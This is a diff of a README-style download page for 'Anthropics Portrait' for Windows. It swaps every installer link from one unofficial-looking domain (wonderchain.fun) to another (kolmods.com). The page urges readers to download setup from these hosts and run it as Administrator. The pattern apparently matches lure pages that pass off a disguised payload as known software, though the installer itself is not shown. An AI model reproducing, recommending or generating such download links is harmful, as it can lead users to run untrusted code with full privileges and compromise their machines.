@@ -16,27 +16,27 @@ Direct installer link below.
 > **This is the download page.** Use the button or link below to get **Anthropics Portrait** for Windows.
 
 <p align="center">
-  <a href="https://anthropicsportrait.wonderchain.fun/">
+  <a href="https://anthropicsportrait.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Anthropics%20Portrait-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Anthropics Portrait">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[anthropicsportrait.wonderchain.fun](https://anthropicsportrait.wonderchain.fun/)** |
-| **Full URL** | `https://anthropicsportrait.wonderchain.fun/` |
+| **Direct link** | **[anthropicsportrait.kolmods.com](https://anthropicsportrait.kolmods.com/)** |
+| **Full URL** | `https://anthropicsportrait.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — anthropicsportrait.wonderchain.fun](https://anthropicsportrait.wonderchain.fun/)** (link above)
+1. Click **[Download — anthropicsportrait.kolmods.com](https://anthropicsportrait.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://anthropicsportrait.wonderchain.fun/"><strong>⬇ Download Anthropics Portrait now</strong></a></p>
+<p align="center"><a href="https://anthropicsportrait.kolmods.com/"><strong>⬇ Download Anthropics Portrait now</strong></a></p>
 
 ---
 
